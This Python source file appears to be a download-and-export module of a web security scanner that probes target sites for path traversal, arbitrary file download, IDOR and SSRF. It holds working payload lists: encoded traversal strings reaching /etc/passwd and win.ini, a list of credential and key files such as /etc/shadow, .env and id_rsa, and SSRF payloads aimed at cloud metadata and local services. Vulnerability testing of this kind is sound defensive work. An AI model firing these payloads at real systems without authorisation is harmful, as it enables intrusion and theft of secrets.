import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from modules.base import BaseModule
from core.utils import extract_params

class DownloadModule(BaseModule):
    name = "download"
    description = "File Download & Export Security Scanner"
    
    download_indicators = [
        r'download', r'export', r'file', r'attachment', r'document',
        r'report', r'invoice', r'receipt', r'pdf', r'csv', r'excel',
    ]
    
    download_params = [
        "file", "filename", "path", "filepath", "document", "doc",
        "attachment", "download", "export", "report", "id", "name",
        "src", "source", "url", "link", "resource",
    ]
    
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "....\\/....\\/....\\/etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "file:///etc/passwd",
    ]
    
    sensitive_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\win.ini", "C:\\boot.ini",
        ".env", "config.php", "database.yml", "secrets.yml",
        "web.config", "appsettings.json", ".htpasswd",
        "id_rsa", "id_dsa", ".ssh/authorized_keys",
    ]
    
    async def scan(self, target):
        self.findings = []
        
        await self._detect_download_functionality(target)
        await self._test_path_traversal(target)
        await self._test_arbitrary_download(target)
        await self._test_idor_download(target)
        await self._test_ssrf_download(target)
        await self._check_download_auth(target)
        
        return self.findings
    
    async def _detect_download_functionality(self, target):
        resp = await self.http.get(target)
        if not resp.get("status"):
            return
        
        text = resp.get("text", "")
        
        download_links = re.findall(
            r'<a[^>]+href=["\']([^"\']+(?:download|export|file|attachment)[^"\']*)["\']',
            text, re.IGNORECASE
        )
        
        download_params_found = re.findall(
            r'[?&](file|filename|path|document|download|export|attachment)=([^&"\'>\s]+)',
            text, re.IGNORECASE
        )
        
        if download_links or download_params_found:
            self.add_finding(
                "INFO",
                f"Download functionality detected",
                url=target,
                evidence=f"Links: {len(download_links)}, Params: {len(download_params_found)}"
            )
            
            for param, value in download_params_found:
                await self._test_param_traversal(target, param, value)
    
    async def _test_path_traversal(self, target):
        params = extract_params(target)
        
        for param in params:
            param_lower = param.lower()
            if any(dp in param_lower for dp in self.download_params):
                for payload in self.traversal_payloads:
                    test_url = self._replace_param(target, param, payload)
                    resp = await self.http.get(test_url)
                    
                    if resp.get("status") == 200:
                        text = resp.get("text", "")
                        
                        if "root:" in text and "/bin/" in text:
                            self.add_finding(
                                "CRITICAL",
                                f"Path traversal: /etc/passwd via {param}",
                                url=test_url,
                                parameter=param,
                                evidence="Unix passwd file contents retrieved"
                            )
                            return
                        
                        if "[extensions]" in text or "[fonts]" in text:
                            self.add_finding(
                                "CRITICAL",
                                f"Path traversal: win.ini via {param}",
                                url=test_url,
                                parameter=param,
                                evidence="Windows ini file contents retrieved"
                            )
                            return
    
    async def _test_param_traversal(self, target, param, original_value):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for payload in self.traversal_payloads[:5]:
            test_url = f"{base}{parsed.path}?{param}={quote(payload)}"
            resp = await self.http.get(test_url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                if "root:" in text or "[extensions]" in text:
                    self.add_finding(
                        "CRITICAL",
                        f"Path traversal via {param}",
                        url=test_url,
                        parameter=param,
                        evidence="System file retrieved"
                    )
                    return
    
    async def _test_arbitrary_download(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        download_endpoints = [
            "/download", "/export", "/file", "/attachment", "/document",
            "/api/download", "/api/export", "/api/file",
            "/files/download", "/documents/download",
        ]
        
        for endpoint in download_endpoints:
            for param in ["file", "path", "name", "id"]:
                for sensitive in self.sensitive_files[:5]:
                    test_url = f"{base}{endpoint}?{param}={quote(sensitive)}"
                    resp = await self.http.get(test_url)
                    
                    if resp.get("status") == 200:
                        text = resp.get("text", "")
                        headers = resp.get("headers", {})
                        
                        content_disp = headers.get("Content-Disposition", "")
                        
                        if "attachment" in content_disp or len(text) > 0:
                            if "root:" in text or "DB_" in text or "SECRET" in text:
                                self.add_finding(
                                    "CRITICAL",
                                    f"Arbitrary file download: {sensitive}",
                                    url=test_url,
                                    parameter=param,
                                    evidence="Sensitive file contents retrieved"
                                )
                                return
                            
                            if content_disp and sensitive.split("/")[-1] in content_disp:
                                self.add_finding(
                                    "HIGH",
                                    f"Arbitrary file download possible",
                                    url=test_url,
                                    parameter=param,
                                    evidence=f"File served: {content_disp}"
                                )
                                return
    
    async def _test_idor_download(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        idor_patterns = [
            "/download/{id}", "/file/{id}", "/document/{id}",
            "/attachment/{id}", "/invoice/{id}", "/receipt/{id}",
            "/export/{id}", "/report/{id}", "/pdf/{id}",
            "/api/download/{id}", "/api/file/{id}",
        ]
        
        for pattern in idor_patterns:
            for test_id in [1, 2, 100, 999]:
                test_url = f"{base}{pattern.replace('{id}', str(test_id))}"
                resp = await self.http.get(test_url)
                
                if resp.get("status") == 200:
                    headers = resp.get("headers", {})
                    content_type = headers.get("Content-Type", "")
                    
                    if any(ct in content_type for ct in ["pdf", "octet-stream", "csv", "excel", "zip"]):
                        self.add_finding(
                            "HIGH",
                            f"Download IDOR: File {test_id} accessible",
                            url=test_url,
                            evidence=f"Content-Type: {content_type}"
                        )
                        return
                    
                    text = resp.get("text", "")
                    if len(text) > 100 and "error" not in text.lower():
                        self.add_finding(
                            "MEDIUM",
                            f"Potential download IDOR: ID {test_id}",
                            url=test_url,
                            evidence="Content returned for sequential ID"
                        )
    
    async def _test_ssrf_download(self, target):
        params = extract_params(target)
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22",
            "http://localhost/admin",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stats",
            "gopher://127.0.0.1:6379/_INFO",
        ]
        
        url_params = ["url", "link", "src", "source", "file", "path", "fetch", "load"]
        
        for param in params:
            if param.lower() in url_params:
                for payload in ssrf_payloads[:3]:
                    test_url = self._replace_param(target, param, payload)
                    resp = await self.http.get(test_url)
                    
                    if resp.get("status") == 200:
                        text = resp.get("text", "")
                        
                        if "ami-id" in text or "instance-id" in text:
                            self.add_finding(
                                "CRITICAL",
                                f"SSRF via download: AWS metadata",
                                url=test_url,
                                parameter=param,
                                evidence="Cloud metadata exposed"
                            )
                            return
                        
                        if "root:" in text:
                            self.add_finding(
                                "CRITICAL",
                                f"SSRF via download: Local file read",
                                url=test_url,
                                parameter=param,
                                evidence="File protocol accepted"
                            )
                            return
    
    async def _check_download_auth(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        resp = await self.http.get(target)
        if not resp.get("status"):
            return
        
        text = resp.get("text", "")
        
        download_links = re.findall(
            r'href=["\']([^"\']+\.(pdf|doc|docx|xls|xlsx|csv|zip|rar)[^"\']*)["\']',
            text, re.IGNORECASE
        )
        
        for link, ext in download_links[:5]:
            if not link.startswith("http"):
                link = urljoin(base, link)
            
            resp = await self.http.get(link)
            
            if resp.get("status") == 200:
                content_type = resp.get("headers", {}).get("Content-Type", "")
                
                if "octet-stream" in content_type or ext in content_type:
                    if "token" not in link.lower() and "auth" not in link.lower():
                        self.add_finding(
                            "MEDIUM",
                            f"Unprotected file download",
                            url=link,
                            evidence=f"Direct file access without auth token"
                        )
    
    def _replace_param(self, url, param, value):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
